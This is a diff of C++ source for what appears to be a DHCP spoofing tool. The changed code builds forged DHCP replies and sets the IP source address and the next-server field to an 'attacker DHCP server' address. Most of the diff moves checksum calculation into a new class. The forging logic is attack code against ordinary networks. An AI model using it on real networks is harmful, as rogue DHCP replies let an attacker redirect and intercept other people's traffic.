@@ -5,10 +5,15 @@
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <unistd.h>
-#include "checksum.h"
+#include "cal_checksum.h"
 #include "dhcp_header.h"
 #include "parse.h"
 
+#define ipchecksum 0
+#define udpchecksum 1
+#define tcpchecksum 2
+#define icmpchecksum 3
+#define OUT_OF_RANGE 65536
 #define MTU 1500
 
 bool detect_parsing_packet(parse *ps)//void -> bool
@@ -108,6 +113,7 @@ bool detect_parsing_packet(parse *ps)//void -> bool
                                 break;
                             }
                         }
+                        cal_checksum cc;
                         cout << ">> Data modify Complete" << endl;
                         ps->make_dhcp_arr_space(MTU);
                         ps->get_dhcp_data_length(ntohs(up->len)-sizeof(struct udphdr));
@@ -120,18 +126,23 @@ bool detect_parsing_packet(parse *ps)//void -> bool
                         ps->make_dhcp_packet((uint8_t*)ep,sizeof(struct ether_header),false);
                         ps->pre_packet_length=sizeof(struct ether_header);
                         ip->saddr=*ps->using_attacker_dhcp_server_ip();
+
                         //ip checksum
-                        ip->check=htons(ip_checksum(ip)); //
+                        cc.get_iphdr(ip);
+                        ip->check=htons(cc.checksum(ipchecksum)); //
                         ps->make_dhcp_packet((uint8_t*)ip,ip->ihl*4,true);
                         ps->pre_packet_length+=ip->ihl*4;
                         bs->transaction_id=*ps->using_transaction_id();
+
                         //udp checksum
-                        up->check=htons(udp_checksum(ip,up,ps));
+                        bs->next_server_ip_addr=*ps->using_attacker_dhcp_server_ip();
+                        cc.get_udphdr(up);
+                        cc.get_pesudo(udpchecksum);
+                        up->check=htons(cc.checksum(udpchecksum));
                         ps->make_dhcp_packet((uint8_t*)up,sizeof(struct udphdr),true);
                         ps->pre_packet_length+=sizeof(struct udphdr);
-                        bs->next_server_ip_addr=*ps->using_attacker_dhcp_server_ip();
                         ps->make_dhcp_packet((uint8_t*)bs,ps->using_dhcp_data_length(),true);
-                        ps->show_dhcp_packet();
+                        //ps->show_dhcp_packet();
                         check2=1;
                     }
                 }
